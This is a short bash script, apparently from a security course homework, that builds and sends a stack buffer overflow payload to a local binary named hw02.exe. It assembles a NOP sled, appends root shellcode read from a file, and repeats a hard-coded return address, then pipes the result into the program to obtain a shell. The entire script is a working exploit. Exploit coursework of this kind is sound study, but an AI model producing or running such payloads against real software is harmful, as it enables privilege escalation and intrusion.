#!/bin/bash

target="hw02.exe"
offset=316
shellCodeName="shellcode_root.bin"
bufferAddress="\xc4\xbf\xff\xff" #This is the address to test the patched file
shellCodeSize=$(wc -c $shellCodeName | cut -c -2)
numReturnRepeats=5

returnSize=$((4*$numReturnRepeats))
NOPSledSize=$(($offset-$shellCodeSize-$returnSize))

if [[ $shellCodeSize -ne 35 ]]; then #Ensure we're using root shellcode 
    echo "Wrong shellcode file"
else
    payloadName="payload.bin"
    echo -n > $payloadName
    for (( i=1; i<=$NOPSledSize; i++)) do
        echo -ne "\x90" >> $payloadName
    done

    cat shellcode_root.bin >> $payloadName
    for (( i=1; i<=$numReturnRepeats; i++)) do
        echo -ne "$bufferAddress" >> $payloadName
    done
    
    payLoadSize=$(wc -c $payloadName | cut -c -3)

    echo "Payload is ready with size of $payLoadSize"
    echo "Sending Payload..."
    cat $payloadName -|./$target
fi